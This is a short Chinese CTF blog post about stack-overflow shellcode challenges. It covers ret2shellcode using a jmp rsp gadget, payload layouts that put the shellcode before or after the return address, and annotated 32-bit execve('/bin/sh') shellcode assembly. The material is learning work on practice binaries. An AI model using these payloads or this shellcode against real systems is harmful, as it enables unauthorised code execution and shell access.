shellcode姿势

今天写了两个shellcode的题目，本来觉得很简单，就和以前遇到的jmp esp就行了，不用什么栈的移动啥的，然后我就写了一个小时。。。

果然我还是too young

  • 第一题是 ciscn_2019_s_9
  • 第二题是 x_ctf_b0verfl0w
  • 例题是 ACTF2021 新人赛的ret2shellcode

题解

首先，我们先不管shellcode怎么编写，直接来看看这个ret2shellcode。

源码就不上了，直接给一个可以溢出的read函数。

return read(0, &buf, 0x500uLL);

然后还给了一个gadget，

.text:0000000000400705 gadgets         proc near
.text:0000000000400705 ; __unwind {
.text:0000000000400705                 push    rbp
.text:0000000000400706                 mov     rbp, rsp
.text:0000000000400709                 jmp     rsp
.text:0000000000400709 gadgets         endp

然后保护都没有开，是shellcode都知道，但是没有给bss段的buf，刚开始比较懵，后来懂了。

把shellcode布置到栈上，然后利用jmp esp执行

这里的payload就直接出来了。

payload = padding + fake_ebp + p63(jmp_rsp) + shellcode

就这样就可以了，执行到jmp_rsp的时候，rsp已经指向了shellcode，所以会直接执行shellcode。

然后变式cisn和xctf的题目

利用点一样，但是傻傻的我就是没有发现，哪里不一样。

兄弟们，以后利用shellcode的时候，或者是溢出的时候，一定要计算一下可以利用的字节，和shellcode的长度，不然就会和我一样，对着shellcode捣鼓半天。。。*

这两个题目，利用空间不足，不足以把shellcode写在jmp_esp后面，所以！我们！选择！把！shellcode写在padding里面，然后稍微计算一下偏移。哭唧唧

payload可以改成下面这种模式。

payload = shellcode + 'a'*(padding - len(shellcode)) + fake_ebp + jmp_esp + asm('sub esp,xx;jmp esp')

xx就是shellcode距离现在esp的偏移。

上payload吧。

shellcode的编写和收集

shellcode ='''
xor eax,eax             #eax置0
xor edx,edx				#edx置0
push edx				#将0入栈，标记了”/bin/sh”的结尾
push 0x68732f2f         #传递”/sh”，为了4字节对齐，使用//sh，这在execve()中等同于/sh
push 0x6e69622f         #传递“/bin”
mov ebx,esp             #此时esp指向了”/bin/sh”,通过esp将该字符串的值传递给ebx
xor ecx,ecx
mov al,0xB              #eax置为execve函数的中断号
int 0x80                #调用软中断
'''
shellcode=asm（shellcode）

这是32位的shellcode，64位基本原理差不多。调用系统调用

这里要注意的是，传递字符串的时候，小端存储，要把字符串转化成16进制之后的字节形式逆序。
